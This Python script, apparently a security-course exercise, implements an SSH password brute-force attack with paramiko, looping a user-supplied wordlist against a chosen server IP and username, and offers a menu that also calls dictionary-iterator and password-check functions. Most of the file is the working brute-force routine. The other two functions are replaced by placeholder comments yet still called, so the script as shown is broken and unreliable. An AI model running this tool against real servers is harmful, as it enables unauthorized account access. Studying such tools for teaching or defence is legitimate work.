#!/usr/bin/env python3

# Script:                       17.py
# Author:                       Nicolaus Watson
# Date of latest revision:      2/2/2024
# Purpose:                      To perform a brute force wordlist attack, check if a password exists in a wordlist, and perform SSH brute force.
# Referenced:                   Python documentation, Paramiko documentation, ChatGpt, Codefellows github repo 

# ppip install paramiko

import time
import paramiko

# Offensive mode: Dictionary Iterator
# ... (Previous code remains unchanged)

# Defensive mode: Password Recognized
# ... (Previous code remains unchanged)

# Function: SSH Brute Force
# Tries to authenticate to an SSH server using each word in the provided word list until successful.
def ssh_brute_force():
    ssh_ip = input("Enter the SSH server IP address:\n")
    ssh_username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath:\n")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add the server's host key without confirmation (for demo purposes).

    with open(filepath, 'r', encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            try:
                print(f"Trying password: {password}")
                ssh.connect(ssh_ip, username=ssh_username, password=password, timeout=1)
                print(f"Success! Password: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                # This exception is raised when authentication fails. Continue to the next password.
                pass
            except Exception as e:
                # Handle other exceptions such as connection errors.
                print(f"An error occurred: {e}")
                break
    ssh.close()

# Main function
if __name__ == "__main__":
    while True:
        # ... (Previous code remains unchanged)
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Brute Force
4 - Exit
Please enter a number: 
""")
        if mode == "1":
            dictionary_iterator()
        elif mode == "2":
            password_recognized()
        elif mode == '3':
            ssh_brute_force()
        elif mode == '4':
            break
        else:
            print("Invalid selection...")
